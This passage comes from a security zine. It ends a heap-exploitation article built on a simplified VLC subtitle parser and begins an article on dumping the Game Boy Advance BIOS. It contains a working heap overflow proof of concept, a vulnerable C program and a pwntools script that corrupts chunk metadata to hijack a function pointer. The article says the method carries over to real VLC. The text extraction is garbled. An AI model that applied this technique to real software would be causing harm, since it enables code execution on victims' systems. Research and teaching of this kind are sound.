27For a Python script which implements the logic
described above, see page 37. Calculating the ex-
act offsets is left as an exercise to the reader. Put
everything together and execute it.
1 $ g c c −Wall −o pwnme −fPIE −g3 pwnme . c
$ echo | . / pwnme
3 s t a r t i n g to read user input
e v e r y t h i n g went down w e l l
5 $ python exp . py | . / pwnme
s t a r t i n g to read user input
7 OMG I can ’ t b e l i e v e i t − t o t a l l y _ p w n e d
Success! The exploit partially overwrites the
pointer with an arbitrary value and redirects the
execution to the totally_pwned function.
As mentioned earlier, the logic and flow was
pulled from the VLC project and this technique can
be used there to exploit it, with additional comple-
mentary steps like Heap Feng-Shui and ROP. See the
VLC Exploitation section of our CheckPoint blog
post on the Hacked in Translation exploit for more
details about exploiting that specific vulnerability. 16
Afterword
In the past twenty years we have witnessed many
exploits take advantage of glibc’s malloc inline-
metadata approach, from Once upon a free 17 and
Malloc Maleficarum 18 to the poisoned NULL byte. 19
Some improvements, such as glibc metadata harden-
ing, 20 were made over the years and integrity checks
were added, but it’s not enough! Integrity checks
are not security mitigation! The “House of Force”
from 2005 is still working today! The CTF team
Shellphish maintains an open repository of heap ma-
nipulation and exploitation techniques. 21 As of this
writing, they all work on the newest Linux distribu-
tions.
We are very grateful for the important work of
having a FOSS implementation of the C standard li-
brary for everyone to use. However, it is time for us
to have a more secure heap by default. It is time to
either stop using plain metadata where it’s suscepti-
ble to malicious overwrites or separate our data and
metadata or otherwise strongly ensure the integrity
of the metadata à la heap cookies.
16 Hacked
In Translation Director’s Cut, Checkpoint Security, unzip pocorgtfo16.pdf hackedintranslation.pdf
57:9. unzip pocorgtfo16.pdf onceuponafree.txt
18 unzip pocorgtfo16.pdf MallocMaleficarum.txt
19 Poisoned NUL Byte 2014 Edition, Chris Evans, Project Zero Blog
20 Further Hardening glibc Malloc() against Single Byte Overflows, Chris Evans, Scary Beasts Blog
21 git clone https://github.com/shellphish/how2heap || unzip pocorgtfo16.pdf how2heap.tar
17 Phrack
28pwnme.c
1 /∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗
∗ pwnme . c : s i m p l i f i e d v e r s i o n o f s u b t i t l e . c from VLC f o r e d u c t a i o n a l p u r p o s e .
3 ∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗∗
∗ This f i l e c o n t a i n s a l o t o f code c o p i e d from moduls /demux/ s u b t i t l e . c from
5 ∗ VLC v e r s i o n 2 . 2 . 2 l i c e n s e d under LGPL s t a t e d h e r e b y .
∗
7 ∗ See t h e o r i g i n a l code i n h t t p : / / g i t . v i d e o l a n . o r g
∗
9 ∗ C o p y r i g h t (C) 2017 y a n n a y l
∗
11 ∗ This program i s f r e e s o f t w a r e ; you can r e d i s t r i b u t e i t and/ or modify i t
∗ under t h e terms o f t h e GNU L e s s e r General P u b l i c L i c e n s e as p u b l i s h e d by
13 ∗ t h e Free S o f t w a r e Foundation ; e i t h e r v e r s i o n 2 . 1 o f t h e L i c e n s e , or
∗ ( a t your o p t i o n ) any l a t e r v e r s i o n .
15 ∗
∗ This program i s d i s t r i b u t e d i n t h e hope t h a t i t w i l l be u s e f u l ,
17 ∗ b u t WITHOUT ANY WARRANTY; w i t h o u t even t h e i m p l i e d w a r r a n t y o f
∗ MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See t h e
19 ∗ GNU L e s s e r General P u b l i c L i c e n s e f o r more d e t a i l s .
∗
21 ∗ You s h o u l d have r e c e i v e d a copy o f t h e GNU L e s s e r General P u b l i c L i c e n s e
∗ a l o n g w i t h t h i s program ; i f not , w r i t e t o t h e Free S o f t w a r e Foundation ,
23 ∗ I n c . , 51 F r a n k l i n S t r e e t , F i f t h Floor , Boston MA 02110 −1301 , USA.
∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗ ∗/
25
#include <s t d i n t . h>
27 #include < s t d l i b . h>
#include < s t r i n g . h>
29 #include <s t d i o . h>
#include <c t y p e . h>
31 #include <s t d b o o l . h>
#include <u n i s t d . h>
33
35 #define VLC_UNUSED( x ) ( void ) ( x )
37 enum {
VLC_SUCCESS = 0 ,
39
VLC_ENOMEM = −1,
VLC_EGENERIC = −2,
41 } ;
43 typedef struct
{
45
int64_t i _ s t a r t ;
int64_t i_stop ;
47
char
∗ psz_text ;
49 } s u b t i t l e _ t ;
51 typedef struct
{
53
int
i_line_count ;
int
i_line ;
55
char
∗∗ l i n e ;
} text_t ;
57
typedef struct
59 {
int
i_type ;
61
text_t
txt ;
void
∗ es ;
2963
65
67
69
int64_t
int64_t i_next_demux_date ;
i_microsecperframe ;
char
int
int
subtitle_t ∗ psz_header ;
i_subtitle ;
i_subtitles ;
∗ subtitle ;
int64_t i_length ;
71
73
75
77
79
81
83
85
/∗ ∗/
struct
{
bool b_inited ;
i n t i_comment ;
int i_time_resolution ;
int i_time_shift ;
} jss ;
struct
{
bool
b_inited ;
87
float f_total ;
float f_factor ;
89
} mpsub ;
} demux_sys_t ;
91
typedef struct {
93
int fd ;
char ∗ data ;
95
char ∗ s e e k ;
char ∗ end ;
97 } stream_t ;
99 typedef struct {
demux_sys_t ∗ p_sys ;
101
stream_t ∗ s ;
char padding [ 6 ∗ s i z e o f ( s i z e _ t ) ] ;
103
void ( ∗pwnme) ( void ) ;
char moar_padding [ 2 ∗ s i z e o f ( s i z e _ t ) ] ;
105 } demux_t ;
107 void msg_Dbg( demux_t ∗p_demux , const char ∗ fmt , . . . ) {
}
109
void r e a d _ u n t i l _ e o f ( stream_t ∗ s ) {
111
size_t s i z e = 0 , capacity = 0;
s s i z e _ t r e t = −1;
113
do {
i f ( c a p a c i t y − s i z e == 0 ) {
115
c a p a c i t y += 0 x1000 ;
s−>data = r e a l l o c ( s−>data , c a p a c i t y ) ;
117
}
r e t = r e a d ( s−>fd , s−>data + s i z e , c a p a c i t y − s i z e ) ;
119
s i z e += r e t ;
} while ( r e t > 0 ) ;
121
s−>end = s−>data + s i z e ;
s−>s e e k = s−>data ;
123 }
125 char ∗ stream_ReadLine ( stream_t ∗ s ) {
i f ( s−>data == NULL) {
127
read_until_eof ( s ) ;
30}
129
i f ( s−>s e e k >= s−>end ) {
return NULL;
}
131
133
char ∗ end = memchr ( s−>s e e k , ’ \n ’ , s−>end − s−>s e e k ) ;
i f ( end == NULL) {
end = s−>end ;
}
s i z e _ t l i n e _ l e n = end − s−>s e e k ;
135
137
139
char ∗ l i n e = m a l l o c ( l i n e _ l e n + 1 ) ;
memcpy ( l i n e , s−>s e e k , l i n e _ l e n ) ;
l i n e [ l i n e _ l e n ] = ’ \0 ’ ;
s−>s e e k = end + 1 ;
141
143
145
return l i n e ;
}
147
149
void ∗ r e a l l o c _ o r _ f r e e ( void ∗p , s i z e _ t s i z e ) {
return r e a l l o c ( p , s i z e ) ;
}
151
s t a t i c i n t TextLoad ( t e x t _ t ∗ t x t , stream_t ∗ s )
153 {
int
i_line_max ;
155
/∗ i n i t t x t ∗/
157
i_line_max
= 500;
t x t −>i _ l i n e _ c o u n t
= 0;
159
t x t −>i _ l i n e
= 0;
t x t −>l i n e
= c a l l o c ( i_line_max , s i z e o f ( char ∗ ) ) ;
161
i f ( ! t x t −>l i n e )
return VLC_ENOMEM;
163
/∗ l o a d t h e c o m p l e t e f i l e ∗/
165
for ( ; ; )
{
167
char ∗ p s z = stream_ReadLine ( s ) ;
169
i f ( p s z == NULL )
break ;
171
t x t −>l i n e [ t x t −>i _ l i n e _ c o u n t ++] = p s z ;
i f ( t x t −>i _ l i n e _ c o u n t >= i_line_max )
{
i_line_max += 1 0 0 ;
t x t −>l i n e = r e a l l o c _ o r _ f r e e ( t x t −>l i n e , i_line_max ∗ s i z e o f ( char ∗ ) ) ;
i f ( ! t x t −>l i n e )
return VLC_ENOMEM;
}
173
175
177
179
}
181
183
185
i f ( t x t −>i _ l i n e _ c o u n t <= 0 )
{
f r e e ( t x t −>l i n e ) ;
return VLC_EGENERIC;
}
187
return VLC_SUCCESS;
189 }
191 s t a t i c void TextUnload ( t e x t _ t ∗ t x t )
{
31193 int i ;
195 f o r ( i = 0 ; i < t x t −>i _ l i n e _ c o u n t ; i++ )
{
f r e e ( t x t −>l i n e [ i ] ) ;
}
f r e e ( t x t −>l i n e ) ;
t x t −>i _ l i n e
= 0;
t x t −>i _ l i n e _ c o u n t = 0 ;
197
199
201
}
203
s t a t i c char ∗ TextGetLine ( t e x t _ t ∗ t x t )
205 {
i f ( t x t −>i _ l i n e >= t x t −>i _ l i n e _ c o u n t )
207
return ( NULL ) ;
return t x t −>l i n e [ t x t −>i _ l i n e ++];
209
}
211
s t a t i c i n t ParseJSS ( demux_t ∗p_demux , s u b t i t l e _ t ∗ p _ s u b t i t l e , i n t i _ i d x )
213 {
VLC_UNUSED( i _ i d x ) ;
215
demux_sys_t ∗ p_sys = p_demux−>p_sys ;
217
text_t
∗ t x t = &p_sys−>t x t ;
char
∗ psz_text , ∗ p s z _ o r i g ;
219
char
∗ psz_text2 , ∗ p s z _ o r i g 2 ;
i n t h1 , h2 , m1 , m2 , s1 , s2 , f 1 , f 2 ;
221
i f ( ! p_sys−>j s s . b _ i n i t e d )
223
{
p_sys−>j s s . i_comment = 0 ;
225
p_sys−>j s s . i _ t i m e _ r e s o l u t i o n = 3 0 ;
p_sys−>j s s . i _ t i m e _ s h i f t = 0 ;
227
p_sys−>j s s . b _ i n i t e d = t r u e ;
229
}
231
233
235
/∗ Parse t h e main l i n e s ∗/
for ( ; ; )
{
const char ∗ s = TextGetLine ( t x t ) ;
if ( ! s )
return VLC_EGENERIC;
237
239
241
243
245
247
249
251
253
255
257
psz_orig = malloc ( s t r l e n ( s ) + 1 ) ;
i f ( ! psz_orig )
return VLC_ENOMEM;
psz_text = psz_orig ;
/∗ Complete time l i n e s ∗/
i f ( s s c a n f ( s , "%d:%d:%d.%d %d:%d:%d.%d %[^\n\ r ] " ,
&h1 , &m1 , &s1 , &f 1 , &h2 , &m2 , &s2 , &f 2 , p s z _ t e x t ) == 9 )
{
p _ s u b t i t l e −>i _ s t a r t = ( ( i n t 6 4 _ t ) ( h1 ∗3600 + m1 ∗ 60 + s 1 ) +
( i n t 6 4 _ t ) ( ( f 1+p_sys−>j s s . i _ t i m e _ s h i f t ) / p_sys−>j s s . i _ t i m e _ r e s o l u t i o n ) )
∗ 1000000;
p _ s u b t i t l e −>i _ s t o p = ( ( i n t 6 4 _ t ) ( h2 ∗3600 + m2 ∗ 60 + s 2 ) +
( i n t 6 4 _ t ) ( ( f 2+p_sys−>j s s . i _ t i m e _ s h i f t ) / p_sys−>j s s . i _ t i m e _ r e s o l u t i o n ) )
∗ 1000000;
break ;
}
/∗ S h o r t time l i n e s ∗/
e l s e i f ( s s c a n f ( s , "@%d @%d %[^\n\ r ] " , &f 1 , &f 2 , p s z _ t e x t ) == 3 )
{
32p _ s u b t i t l e −>i _ s t a r t = ( i n t 6 4 _ t ) (
( f 1+p_sys−>j s s . i _ t i m e _ s h i f t ) / p_sys−>j s s . i _ t i m e _ r e s o l u t i o n ∗ 1 0 0 0 0 0 0 . 0 ) ;
p _ s u b t i t l e −>i _ s t o p = ( i n t 6 4 _ t ) (
( f 2+p_sys−>j s s . i _ t i m e _ s h i f t ) / p_sys−>j s s . i _ t i m e _ r e s o l u t i o n ∗ 1 0 0 0 0 0 0 . 0 ) ;
break ;
259
261
263
265
267
269
}
/∗ General D i r e c t i v e l i n e s ∗/
/∗ Only TIME and SHIFT a r e s u p p o r t e d so f a r ∗/
e l s e i f ( s [ 0 ] == ’# ’ )
{
i n t h = 0 , m =0 , s e c = 1 , f = 1 ;
unsigned s h i f t = 1 ;
int inv = 1 ;
271
s t r c p y ( psz_text , s ) ;
273
switch ( t o u p p e r ( ( unsigned char ) p s z _ t e x t [ 1 ] ) )
{
case ’ S ’ :
s h i f t = i s a l p h a ( ( unsigned char ) p s z _ t e x t [ 2 ] ) ? 6 : 2 ;
275
277
279
i f ( s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%d" , &h ) )
{
/∗ N e g a t i v e s h i f t i n g ∗/
if ( h < 0 )
{
h ∗= −1;
i n v = −1;
}
281
283
285
287
i f ( s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%∗d:%d" , &m ) )
{
i f ( s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%∗d:%∗d:%d" , &s e c ) )
{
s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%∗d:%∗d:%∗d.%d" , &f ) ;
}
else
{
h = 0;
s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%d:%d.%d" ,
&m, &s e c , &f ) ;
m ∗= i n v ;
}
}
else
{
h = m = 0;
s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%d.%d" , &s e c , &f ) ;
s e c ∗= i n v ;
}
p_sys−>j s s . i _ t i m e _ s h i f t = ( ( h ∗ 3600 + m ∗ 60 + s e c )
∗ p_sys−>j s s . i _ t i m e _ r e s o l u t i o n + f ) ∗ i n v ;
289
291
293
295
297
299
301
303
305
307
309
}
break ;
311
313
case ’T ’ :
s h i f t = i s a l p h a ( ( unsigned char ) p s z _ t e x t [ 2 ] ) ? 8 : 2 ;
315
s s c a n f ( &p s z _ t e x t [ s h i f t ] , "%d" , &p_sys−>j s s . i _ t i m e _ r e s o l u t i o n ) ;
break ;
317
}
f r e e ( psz_orig ) ;
continue ;
319
321
}
else
33/∗ Unkown t y p e l i n e , p r o b a b l y a comment ∗/
323
{
325
f r e e ( psz_orig ) ;
continue ;
327
}
}
329
331
while ( p s z _ t e x t [ s t r l e n ( p s z _ t e x t ) − 1 ] == ’ \\ ’ )
{
const char ∗ s 2 = TextGetLine ( t x t ) ;
333
i f ( ! s2 )
{
f r e e ( psz_orig ) ;
return VLC_EGENERIC;
}
335
337
339
int i_len = s t r l e n ( s2 ) ;
i f ( i _ l e n == 0 )
break ;
341
343
int i_old = s t r l e n ( psz_text ) ;
345
p s z _ t e x t = r e a l l o c _ o r _ f r e e ( psz_text , i _ o l d + i _ l e n + 1 ) ;
i f ( ! psz_text )
return VLC_ENOMEM;
347
349
psz_orig = psz_text ;
s t r c a t ( psz_text , s 2 ) ;
351
}
353
355
357
359
361
/∗ S k i p t h e b l a n k s ∗/
while ( ∗ p s z _ t e x t == ’ ’ | | ∗ p s z _ t e x t == ’ \ t ’ ) p s z _ t e x t++;
/∗ Parse t h e d i r e c t i v e s ∗/
i f ( i s a l p h a ( ( unsigned char ) ∗ p s z _ t e x t ) | | ∗ p s z _ t e x t == ’ [ ’ )
{
while ( ∗ p s z _ t e x t != ’ ’ )
{ p s z _ t e x t++ ; } ;
/∗ D i r e c t i v e s a r e NOT p a r s e d y e t ∗/
/∗ This has p r o b a b l y a b e t t e r p l a c e i n a d e c o d e r ? ∗/
/∗ d i r e c t i v e = m a l l o c ( s t r l e n ( p s z _ t e x t ) + 1 ) ;
i f ( s s c a n f ( p s z _ t e x t , "%s %[^\n\ r ] " , d i r e c t i v e , p s z _ t e x t 2 ) == 2 ) ∗/
363
365
367 }
369 /∗ S k i p t h e b l a n k s a f t e r d i r e c t i v e s ∗/
while ( ∗ p s z _ t e x t == ’ ’ | | ∗ p s z _ t e x t == ’ \ t ’ ) p s z _ t e x t++;
371
373
/∗ Clean a l l t h e l i n e s from i n l i n e comments and o t h e r s t u f f s ∗/
psz_orig2 = c a l l o c ( s t r l e n ( psz_text ) + 1 , 1 ) ;
psz_text2 = psz_orig2 ;
375
377
379
381
383
385
387
f o r ( ; ∗ p s z _ t e x t != ’ \0 ’ && ∗ p s z _ t e x t != ’ \n ’ && ∗ p s z _ t e x t != ’ \ r ’ ; )
{
switch ( ∗ p s z _ t e x t )
{
case ’ { ’ :
p_sys−>j s s . i_comment++;
break ;
case ’ } ’ :
i f ( p_sys−>j s s . i_comment )
{
p_sys−>j s s . i_comment = 0 ;
i f ( ( ∗ ( p s z _ t e x t + 1 ) ) == ’ ’ ) p s z _ t e x t++;
34}
break ;
case ’ ~ ’ :
i f ( ! p_sys−>j s s . i_comment )
{
∗ psz_text2 = ’ ’ ;
p s z _ t e x t 2++;
}
break ;
case ’ ’ :
case ’ \ t ’ :
i f ( ( ∗ ( p s z _ t e x t + 1 ) ) == ’ ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’ \ t ’ )
break ;
i f ( ! p_sys−>j s s . i_comment )
{
∗ psz_text2 = ’ ’ ;
p s z _ t e x t 2++;
}
break ;
case ’ \\ ’ :
i f ( ( ∗ ( p s z _ t e x t + 1 ) ) == ’ n ’ )
{
∗ p s z _ t e x t 2 = ’ \n ’ ;
p s z _ t e x t++;
p s z _ t e x t 2++;
break ;
}
i f ( ( t o u p p e r ( ( unsigned char ) ∗ ( p s z _ t e x t + 1 ) ) == ’C ’ ) | |
( t o u p p e r ( ( unsigned char ) ∗ ( p s z _ t e x t + 1 ) ) == ’F ’ ) )
{
p s z _ t e x t++; p s z _ t e x t++;
break ;
}
i f ( ( ∗ ( p s z _ t e x t + 1 ) ) == ’B ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’ b ’ | |
( ∗ ( p s z _ t e x t + 1 ) ) == ’ I ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’ i ’ | |
( ∗ ( p s z _ t e x t + 1 ) ) == ’U ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’ u ’ | |
( ∗ ( p s z _ t e x t + 1 ) ) == ’D ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’N ’ )
{
p s z _ t e x t++;
break ;
}
i f ( ( ∗ ( p s z _ t e x t + 1 ) ) == ’ ~ ’ | | ( ∗ ( p s z _ t e x t + 1 ) ) == ’ { ’ | |
( ∗ ( p s z _ t e x t + 1 ) ) == ’ \\ ’ )
p s z _ t e x t++;
e l s e i f ( ∗ ( p s z _ t e x t + 1 ) == ’ \ r ’ | |
∗ ( p s z _ t e x t + 1 ) == ’ \n ’ | |
∗ ( p s z _ t e x t + 1 ) == ’ \0 ’ )
{
p s z _ t e x t++;
}
break ;
default :
i f ( ! p_sys−>j s s . i_comment )
{
∗ psz_text2 = ∗ psz_text ;
p s z _ t e x t 2++;
}
}
p s z _ t e x t++;
389
391
393
395
397
399
401
403
405
407
409
411
413
415
417
419
421
423
425
427
429
431
433
435
437
439
441
443
445
}
447
p _ s u b t i t l e −>p s z _ t e x t = p s z _ o r i g 2 ;
msg_Dbg( p_demux , "%s " , p _ s u b t i t l e −>p s z _ t e x t ) ;
f r e e ( psz_orig ) ;
return VLC_SUCCESS;
449
451
}
35453
455
s t a t i c void not_pwned ( void ) {
p r i n t f ( " e v e r y t h i n g went down w e l l \n" ) ;
}
457
s t a t i c void t o t a l l y _ p w n e d ( void ) __attribute__ ( ( unused ) ) ;
459 s t a t i c void t o t a l l y _ p w n e d ( void ) {
p r i n t f ( "OMG I can ’ t b e l i e v e i t − t o t a l l y _ p w n e d \n" ) ;
461 }
463 i n t main ( void ) {
i n t ( ∗ pf_read ) ( demux_t ∗ , s u b t i t l e _ t ∗ , i n t ) = ParseJSS ;
465
i n t i_max = 0 ;
demux_sys_t ∗ p_sys = NULL;
467
void ∗ p l a c e h o l d e r = m a l l o c ( 0 xb0 − s i z e o f ( s i z e _ t ) ) ;
469
471
demux_t ∗p_demux = c a l l o c ( s i z e o f ( demux_t ) , 1 ) ;
p_demux−>p_sys = p_sys = c a l l o c ( s i z e o f ( demux_sys_t ) , 1 ) ;
p_demux−>s = c a l l o c ( s i z e o f ( stream_t ) , 1 ) ;
p_demux−>s−>f d = STDIN_FILENO ;
473
p_sys−>i _ s u b t i t l e s = 0 ;
475
477 p_demux−>pwnme = not_pwned ;
free ( placeholder ) ;
479 p r i n t f ( " s t a r t i n g t o r e a d u s e r i n p u t \n" ) ;
481 /∗ Load t h e w h o l e f i l e ∗/
TextLoad ( &p_sys−>t x t , p_demux−>s ) ;
483
485
487
489
491
493
495
497
499
501
503
505
/∗ Parse i t ∗/
f o r ( i_max = 0 ; ; )
{
i f ( p_sys−>i _ s u b t i t l e s >= i_max )
{
i_max += 5 0 0 ;
i f ( ! ( p_sys−>s u b t i t l e = r e a l l o c _ o r _ f r e e ( p_sys−>s u b t i t l e ,
s i z e o f ( s u b t i t l e _ t ) ∗ i_max ) ) )
{
TextUnload ( &p_sys−>t x t ) ;
f r e e ( p_sys ) ;
return VLC_ENOMEM;
}
}
i f ( pf_read ( p_demux , &p_sys−>s u b t i t l e [ p_sys−>i _ s u b t i t l e s ] ,
p_sys−>i _ s u b t i t l e s ) )
break ;
p_sys−>i _ s u b t i t l e s ++;
}
/∗ Unload ∗/
TextUnload ( &p_sys−>t x t ) ;
507
p_demux−>pwnme ( ) ;
509 }
36exp.py
1 #! / u s r / b i n / env p yt h on
3 import pwn , s y s , s t r i n g , i t e r t o o l s , r e
5 SIZE_T_SIZE = 8
CHUNK_SIZE_GRANULARITY = 0 x10
7 MIN_CHUNK_SIZE = SIZE_T_SIZE ∗ 2
9 c l a s s pattern_gen ( object ) :
def __init__ ( s e l f , a l p h a b e t=s t r i n g . a s c i i _ l e t t e r s + s t r i n g . d i g i t s , n=8) :
11
s e l f . _db = pwn . pw nl ib . u t i l . c y c l i c . d e _ b r u i j n ( a l p h a b e t=a l p h a b e t , n=n )
13
def __call__ ( s e l f , n ) :
return ’ ’ . j o i n ( next ( s e l f . _db) f o r _ in xrange ( n ) )
15
pat = pattern_gen ( )
17 nums = i t e r t o o l s . count ( )
19 def u s a b l e _ s i z e ( chunk_size ) :
a s s e r t chunk_size % CHUNK_SIZE_GRANULARITY == 0
21
a s s e r t chunk_size >= MIN_CHUNK_SIZE
23
return chunk_size − SIZE_T_SIZE
25 def a l l o c _ s i z e ( n ) :
n += SIZE_T_SIZE
27
i f n % CHUNK_SIZE_GRANULARITY == 0 :
return n
29
i f n < MIN_CHUNK_SIZE:
31
return MIN_CHUNK_SIZE
33
35
n += CHUNK_SIZE_GRANULARITY
n &= ~(CHUNK_SIZE_GRANULARITY − 1 )
return n
37 def j s s _ l i n e ( t o t a l _ s i z e , o r i g _ s i z e =−1, o r i g 2 _ s i z e =−1, s u f f i x= ’ ’ ) :
i f −1 == o r i g _ s i z e :
39
orig_size = total_size
i f −1 == o r i g 2 _ s i z e :
41
orig2_size = orig_size
a s s e r t o r i g 2 _ s i z e <= o r i g _ s i z e <= t o t a l _ s i z e
43
timing_fmt = ’@{ : d}@{ : d} ’
45
t i m i n g = timing_fmt . format ( next ( nums ) , 0 )
47
49
51
l i n e _ l e n = u s a b l e _ s i z e ( t o t a l _ s i z e ) − 1 # NULL t e r m i n a t o r i n c l u d e d
null_idx = usable_size ( orig_size ) − 1
zero_pad_len = u s a b l e _ s i z e ( o r i g _ s i z e ) − u s a b l e _ s i z e ( o r i g 2 _ s i z e )
zero_pad_len −= len ( t i m i n g )
i f zero_pad_len < 0 :
zero_pad_len = 0
53
p r e f i x = t i m i n g + ’ 0 ’ ∗ zero_pad_len + ’# ’
55
57
l i n e = [ p r e f i x , pat ( n u l l _ i d x − len ( p r e f i x ) − len ( s u f f i x ) ) , s u f f i x ]
i f null_idx < line_len :
l i n e . e x t e n d ( [ ’ \0 ’ , pat ( l i n e _ l e n − n u l l _ i d x − 1 ) ] )
59
l i n e = ’ ’ . j o i n ( l i n e ) + ’ \n ’
61
j s s _ r e g e x = "@\d+@\d +([^\\0\\ r \\n ] ∗ ) "
3763
65
match = r e . s e a r c h ( j s s _ r e g e x , l i n e )
a s s e r t a l l o c _ s i z e ( len ( l i n e ) ) == t o t a l _ s i z e
a s s e r t a l l o c _ s i z e ( len ( match . group ( 0 ) ) + 1 ) == o r i g _ s i z e
a s s e r t a l l o c _ s i z e ( len ( match . group ( 1 ) ) + 1 ) == o r i g 2 _ s i z e
67
return l i n e
69
def comment ( t o t a l _ s i z e , o r i g _ s i z e =−1, f i l l =F a l s e , s u f f i x= ’ ’ , s u f f i x _ p o s =−1) :
f i r s t _ c h a r = ’# ’ i f f i l l e l s e ’ ∗ ’
line_len = usable_size ( total_size ) − 1
73
prefix = first_char
71
75
i f −1 == o r i g _ s i z e :
orig_size = total_size
77
null_idx = usable_size ( orig_size ) − 1
79
81
83
i f −1 == s u f f i x _ p o s :
suffix_pos = null_idx
# ’ } ’ i s i g n o r e d when c o p y i n g JSS l i n e
s u f f i x = s u f f i x + ’ } ’ ∗ ( null_idx − suffix_pos )
85
87
89
91
l i n e = [ p r e f i x , pat ( n u l l _ i d x − len ( p r e f i x ) − len ( s u f f i x ) ) , s u f f i x ]
i f null_idx < line_len :
l i n e . e x t e n d ( [ ’ \0 ’ , pat ( l i n e _ l e n − n u l l _ i d x − 1 ) ] )
l i n e = ’ ’ . j o i n ( l i n e ) + ’ \n ’
a s s e r t a l l o c _ s i z e ( len ( l i n e ) ) == t o t a l _ s i z e
a s s e r t a l l o c _ s i z e ( len ( l i n e [ : − 1 ] . p a r t i t i o n ( ’ \0 ’ ) [ 0 ] ) + 1 ) == o r i g _ s i z e
93
return l i n e
95
e x p l o i t = sys . stdout
97
e x p l o i t . w r i t e ( j s s _ l i n e ( 0 x100 ) ) # make s u r e s t u f f don ’ t c o n s o l i d a t e w i t h t o p
99
# b r e a k h o l e t o two chunks , f r e e them t o f a s t b i n s
101 e x p l o i t . w r i t e ( comment ( 0 x100 , 0 x50 ) )
# s ec o nd h o l e w i l l h o l d t h e v a l u e c o p i e d t o t h e chunk s i z e f i e l d
103 new_chunk_size = ( 0 x60 + 0 x60 ) | 1
p a y l o a d = pwn . p64 ( new_chunk_size ) . s t r i p ( ’ \0 ’ )
105 e x p l o i t . w r i t e ( comment ( 0 x100 , 0 x60 , f i l l =True , s u f f i x=payload , s u f f i x _ p o s =0x4c ) )
# t r i g g e r the v u l n e r a b i l i t y
107 # w i l l o v e r f l o w p s z _ o r i g 2 t o t h e s i z e o f p s z _ o r i g and w r i t e t h e new chunk s i z e
e x p l o i t . w r i t e ( j s s _ l i n e ( 0 x100 , o r i g _ s i z e =0x60 , o r i g 2 _ s i z e =0x50 , s u f f i x= ’ \\ c ’ ) )
109 # now t h e f r e e d chunk i s c o n s i d e r e d s i z e 0 xc0
# c a t c h t h e o r i g i n a l s i z e + CHUNK_SIZE_GRANULARITY and p u t i n f a s t b i n
111 e x p l o i t . w r i t e ( comment ( 0 x100 , 0 x60 + 0 x10 ) )
113 # now we o n l y want t o o v e r r i d e t h e LSB o f p_demux−>pwnme
# we b r e a k t h e r e s t i n t o 2 chunks
115 e x p l o i t . w r i t e ( comment ( 0 x100 , 0 x20 ) ) # b e f o r e &p_demux−>pwnme
e x p l o i t . w r i t e ( comment ( 0 x100 , 0 x30 ) ) # c o n t a i n s &p_demux−>pwnme
117
# we p l a c e t h e LSB o f t h e t o t a l l y _ p w n e d f u n c t i o n i n t h e heap
119 o v e r r i d e = pwn . p64 ( 0 x6d ) . r s t r i p ( ’ \0 ’ )
e x p l o i t . w r i t e ( comment ( 0 x100 , f i l l =True , s u f f i x=o v e r r i d e , s u f f i x _ p o s =0x34 ) )
121
# and now we o v e r f l o w from t h e f i r s t chunk i n t o t h e s e c on d
123 # w r i t i n g t h e LSB o f p_demux−>pwnme
e x p l o i t . w r i t e ( j s s _ l i n e ( 0 x100 , o r i g 2 _ s i z e =0x20 , s u f f i x=" \\ c " ) )
3816:07
Extracting the Game Boy Advance BIOS ROM through the
Execution of Unmapped Thumb Instructions
by Maribel Hearn
Prior Work
Lately, I’ve been a bit obsessed with the Game
Boy Advance. The hardware is simpler than the
modern handhelds I’ve been playing with and the
CPU is of a familiar architecture (ARM7TDMI),
making it a rather fun toy for experimentation. The
hardware is rather well documented, especially by
Martin Korth’s GBATEK page. 22 As the GBA
is a console where understanding what happens
at a cycle-level is important, I have been writing
small programs to test edge cases of the hardware
that I didn’t quite understand from reading alone.
One component where I wasn’t quite happy with
presently available documentation was the BIOS
ROM. Closer inspection of how the hardware be-
haves leads to a more detailed hypothesis of how the
ROM protection actually works, and testing this hy-
pothesis turns into the discovery a new method of
dumping the GBA BIOS.
Let us briefly review previously known techniques
for dumping the BIOS.
The earliest and probably the most well known
dumping method is using a software vulnerability
discovered by Dark Fader in software interrupt 1Fh.
This was originally intended for conversion of MIDI
information to playable frequencies. The first ar-
gument to the SWI a pointer for which bounds-
checking was not performed, allowing for arbitrary
memory access.
A more recent method of dumping the GBA
BIOS was developed by Vicki Pfau, who wrote an
article on the mGBA blog about it, 23 making use of
the fact that you can directly jump to any arbitrary
address in the BIOS to jump. She also develops a
